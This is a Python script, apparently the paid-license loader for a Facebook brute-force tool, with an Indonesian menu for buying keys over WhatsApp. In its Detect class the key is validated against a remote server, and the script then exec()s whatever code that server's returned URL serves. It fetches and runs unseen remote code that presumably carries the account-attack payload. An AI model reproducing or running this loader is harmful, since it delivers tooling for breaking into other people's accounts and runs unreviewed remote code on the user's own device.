# code by Yayan XD and Rizky Dev

import os,sys,re,json,random,subprocess
from time import sleep as waktu
from urllib.parse import quote
from concurrent.futures import ThreadPoolExecutor as YayanGanteng
from datetime import datetime
from time import sleep
ct = datetime.now()
n = ct.month
bulan = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'Nopember', 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
ok=0
cp=0
loop =0
live=[]
chek=[]
ttl= []
jam = datetime.now().strftime('%H:%M:%S')
mbasic="https://mbasic.facebook.com"
def restart():repeath=sys.executable ; os.execl(repeath,repeath,*sys.argv)
try: import requests as req
except ModuleNotFoundError: os.system("python -m pip install requests");restart()
try: from bs4 import BeautifulSoup as parser
except ModuleNotFoundError: os.system("python -m pip install bs4");restart()

### WARNA RANDOM ###
M = "\x1b[1;91m" # MERAH 
H = "\x1b[1;92m" # HIJAU
K = "\x1b[1;93m" # KUNING
B = "\x1b[1;94m" # BIRU
O = "\x1b[1;96m" # BIRU MUDA
N = "\x1b[0m"    # WARNA MATI
#  Moch Yayan Juan Alvredo XD.  #
#------------------------------->

def logo():
	os.system("clear")
	print("""%s
 _____.___.            _____ _____________________
 \__  |   |           /     \\______   \_   _____/ ®
  /   |   |  ______  /  \ /  \|    |  _/|    __)  
  \____   | /_____/ /    Y    \    |   \|     \   
  / ______|         \____|__  /______  /\___  /   
  \/                        \/       \/     \/    """%(N))

PROJECT_NAME = "brute"
URL = "https://blackhuman.000webhostapp.com/chek.php"

class Detect:
	def __init__(self, key):
		self.key = key
	def Run(self):
		check = req.get(URL+"?project="+PROJECT_NAME+"&apikey="+self.key).json()
		if check["status"] == "error":
			exit("Your key is invalid, please contact admin")
		elif check["status"] == "expired":
			try: os.remove("license.txt")
			except: pass
			exit("Your key is expired, please contact admin")
		else:
			open("license.txt","w").write(self.key)
			exec(req.get(check["urls"]).text)

def get_license(integer):
	digit=[]
	lis = list("abcdefghijklmnopqrstuvwxyz123456789")
	gets = [random.choice(lis) for _ in range(integer)]
	return "".join(gets).upper()

def aktif_key():
	try:
		xnxx = open("license.txt","r").read().replace("\n","")
		Detect(xnxx).Run()
	except:
		pass

	digit = random.choice([20])
	digit = get_license(digit)
	logo()
	print("\n [%s+%s] Your key : %s%s%s"%(O,N,H,digit,N))
	print("""
 [%s1%s].%s Daftar premium key%s
 [%s2%s].%s Daftar trial key%s
 [%s3%s].%s Jalankan kode key%s
 [%s4%s].%s Check harga premium%s
 [%s0%s].%s Exit%s"""%(H,N,O,N,H,N,O,N,H,N,O,N,H,N,O,N,M,N,M,N))
	print("%s---------------------------%s>%s>%s>"%(B,M,K,H))
	pil = input(" %s[%s+%s] choose %s:%s "%(N,O,N,M,H))
	while pil == "":
		print("\n %s[%s×%s] jangan kosong bro"%(N,M,N));waktu(2);aktif_key()
	if pil == "1":
		nama = input("\n %s[%s?%s] nama anda  %s:%s "%(N,M,N,M,H))
		mail = input(" %s[%s?%s] email anda %s:%s "%(N,M,N,M,H))
		exit(subprocess.Popen(["am","start","https://wa.me/"+req.get("https://raw.githubusercontent.com/Yayan-XD/server/main/no.txt").text.strip()+"?text=hello admin! tolong konfirmasi kode premium saya.\n* Nama : "+nama+"\n* Email : "+mail+"\n* Key    : " +digit+" "],stderr=subprocess.PIPE,stdin=subprocess.PIPE,stdout=subprocess.PIPE).wait())
	elif pil == "2":
		nama = input("\n %s[%s?%s] nama anda  %s:%s "%(N,M,N,M,H))
		mail = input(" %s[%s?%s] email anda %s:%s "%(N,M,N,M,H))
		exit(subprocess.Popen(["am","start","https://wa.me/"+req.get("https://raw.githubusercontent.com/Yayan-XD/server/main/no.txt").text.strip()+"?text=hello admin! tolong konfirmasi kode trial saya.\n* Nama : "+nama+"\n* Email : "+mail+"\n* Key    : " +digit+" "],stderr=subprocess.PIPE,stdin=subprocess.PIPE,stdout=subprocess.PIPE).wait())
	elif pil == "3":
		keyy = input("\n %s[%s+%s] Apikey %s:%s "%(N,O,N,M,N))
		Detect(keyy).Run()
	elif pil == "4":
		cek_harga()
	elif pil == "0":
		print("\n selamat tinggal syngg😘")
		exit()
	else:
		print("\n %s[%s×%s] input yang bener"%(N,M,N));waktu(2);aktif_key()

def cek_harga():
	logo()
	print (f"""
    %s*%s daftar harga Lisensi %s*%s\n
  %s>%s pembayaran via dana/pulsa %s<%s\n
 [%s1%s]%s 10K (10 rb) Sehari%s
 [%s2%s]%s 15K (15 rb) minggu%s
 [%s3%s]%s 30K (30 rb) 1 bulan%s"""%(O,N,O,N,H,N,H,N,O,N,H,N,O,N,H,N,O,N,H,N))
	input(f"\n   %s[%s ENTER %s]%s "%(H,O,H,N))
	aktif_key()


if __name__ == "__main__":
	os.system("git pull")
	aktif_key()
